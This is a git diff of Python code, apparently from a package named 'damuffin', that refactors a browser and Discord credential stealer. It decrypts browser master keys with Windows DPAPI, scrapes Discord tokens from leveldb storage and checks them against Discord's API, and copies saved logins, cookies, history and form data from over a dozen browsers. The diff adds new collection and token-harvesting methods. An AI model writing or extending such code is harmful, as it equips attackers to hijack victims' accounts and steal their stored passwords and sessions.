@@ -1,6 +1,6 @@
 from win32crypt import CryptUnprotectData
-from . import TemporaryDirectory
 from os.path import exists as path_exists
+from . import TemporaryDirectory
 from Crypto.Cipher import AES
 import threading
 import requests
@@ -57,12 +57,16 @@ def mkfile(path):
 ##───────────────────────────────────────────────────────────────────────#
 
 class BrowserTools:
-    def __init__(self, dir=None, localstate=None):
+    def __init__(self, dir, localstate=None):
         self.path = dir
+
         self.localstate = localstate
         self.__dump_files = []
     
     def get_master_key(self, localstate=None):
+        if self.localstate is None and localstate is None:
+            raise ValueError("Path to local state is not set.")
+
         with open(self.localstate if localstate is None else localstate, 'r', encoding='utf-8') as file:
             return CryptUnprotectData(base64.b64decode(json.loads(file.read())['os_crypt']['encrypted_key'])[5:], None, None, None, 0)[1]
     
@@ -72,7 +76,7 @@ class BrowserTools:
             try: return str(CryptUnprotectData(data, None, None, None, 0)[1])
             except: return "Unsupported"
     
-    def get_discord_tokens(self, browsers):
+    def get_discord_tokens(self, browsers: dict[str, str]):
         paths = {b: p for b, p in {
             **{b: p + "\\Local Storage\\leveldb\\" for b, p in browsers.items()},
             'discord': roaming + '\\discord\\Local Storage\\leveldb\\',
@@ -88,7 +92,7 @@ class BrowserTools:
                 
                 with open(f"{path}\\{file}", errors="ignore") as f:
                     for line in [x.strip() for x in f.readlines() if x.strip()]:
-                        if not "cord" in path:
+                        if "cord" not in path:
                             [discord_tokens.append(t) for t in re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", line) if self.__validate_discord_token(t)]
                             continue
                         
@@ -97,11 +101,11 @@ class BrowserTools:
                             if not path_exists(localstate): continue
                             token = self.decrypt(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(localstate))
 
-                            if not self.__validate_discord_token(token): continue
+                            if not self.validate_discord_token(token): continue
                             discord_tokens.append(token)
         return discord_tokens
 
-    def __validate_discord_token(self, token):
+    def validate_discord_token(self, token):
         return requests.get("https://discordapp.com/api/v9/users/@me", headers={'Authorization': token}).status_code == 200
 
     def cookies(self, cookie_file):
@@ -284,12 +288,10 @@ class BrowserTools:
             thread.start()
 
 class Browsers:
-    def __init__(self, temp: TemporaryDirectory):
-        if not isinstance(temp, TemporaryDirectory):
+    def __init__(self, temp: TemporaryDirectory = None):
+        if not isinstance(temp, TemporaryDirectory) and temp is not None:
             raise ValueError("Expected a damuffin.TemporaryDirectory.")
-
-        self.temp = temp
-
+        
         self.browers = {
             k: v for k, v in {
                 'amigo': localdata + '\\Amigo\\User Data',
@@ -312,15 +314,24 @@ class Browsers:
                 'opera gx': roaming + '\\Opera Software\\Opera GX Stable'
         }.items() if path_exists(v)}
 
+        self.temp = temp
+
         profiles = ["\\Default", "\\Profile 1", "\\Profile 2", "\\Profile 3", "\\Profile 4", "\\Profile 5"]
         files = ["\\Web Data", "\\Login Data", "\\Network\\Cookies", "\\History", "\\Bookmarks"]
 
-        self.profile_browsers = {b: [[l, set([p + l + f for f in files if path_exists(p + l + f)])] for l in profiles if path_exists(p + l)] for b, p in self.browers.items()}
-        self.nonprofile_browsers = {b: {self.browers[b] + f for f in files if path_exists(self.browers[b] + f)} for b, p in self.profile_browsers.items() if p == []}
-        self.profile_browsers = {k: v for k, v in self.profile_browsers.items() if v != []} # Remove Non Profile Browsers
+        profile_browsers = {b: [[l, set([p + l + f for f in files if path_exists(p + l + f)])] for l in profiles if path_exists(p + l)] for b, p in self.browers.items()}
+        self.nonprofile_browsers = {b: {self.browers[b] + f for f in files if path_exists(self.browers[b] + f)} for b, p in profile_browsers.items() if p == []}
+        self.profile_browsers = {k: v for k, v in profile_browsers.items() if v != []} # Remove Non Profile Browsers
+    
+    def collect(self, temp: TemporaryDirectory = None):
+        if not isinstance(temp, TemporaryDirectory) and temp is not None:
+            raise ValueError("Expected a damuffin.TemporaryDirectory.")
+
+        if temp is None and self.temp is None:
+            raise ValueError("No temporary directory was provided.")
 
         # Creating a local copy of browser files prevents
-        # errors when threading sqlite3 databases.
+        # errors when using multi-threading with sqlite3 databases.
         for b, p in {**self.nonprofile_browsers, **self.profile_browsers}.items():
             folder = os.path.join(temp.path, b)
             if not path_exists(folder): os.mkdir(folder)
@@ -343,3 +354,16 @@ class Browsers:
                     mkfile(c) 
                     shutil.copy2(x, c)
                 tools.collect(**{os.path.basename(_).replace(" ", ""): _ for x, _ in local_copies.items()})
+        
+    def get_discord_tokens(self) -> list:
+        localstorage_paths = {}
+        for platform, profiles in self.profile_browsers.items():
+            for profile_paths in profiles:
+                profile = profile_paths[0]
+
+                localstorage_paths[f"{platform} {profile[1:]}"] = self.browers[platform] + "\\Local Storage\\leveldb\\"
+        
+        for platform, path in self.nonprofile_browsers.items():
+            localstorage_paths[f"{platform}"] = self.browers[platform] + "\\Local Storage\\leveldb"
+        
+        return [*set(BrowserTools(None).get_discord_tokens(localstorage_paths))] # Remove Duplicates
